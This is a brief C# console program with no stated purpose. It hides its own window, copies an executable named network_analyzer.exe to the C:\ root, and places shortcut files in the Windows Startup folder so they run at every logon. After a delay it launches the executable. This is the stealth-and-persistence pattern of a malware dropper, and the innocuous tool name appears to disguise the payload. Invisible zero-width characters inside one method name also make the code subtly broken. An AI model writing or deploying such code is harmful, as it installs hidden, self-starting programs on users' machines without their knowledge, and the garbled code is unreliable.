using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void Main(string[] args)
        {
            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(h, 0);
            var resourceName = "network_analyzer.exe";
            File.Copy(resourceName, @"C:\\network_analyzer.exe", true);
            var shortcuts = new DirectoryInfo(Directory.GetCurrentDirectory()).GetF‌​iles("*.lnk");
            foreach (var f in shortcuts)
                File.Copy(f.FullName, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), f.Name), true);
            Thread.Sleep(60000);
 
            var proc = Process.Start(Path.Combine(Directory.GetCurrentDirectory(), resourceName));
        }
    }
}


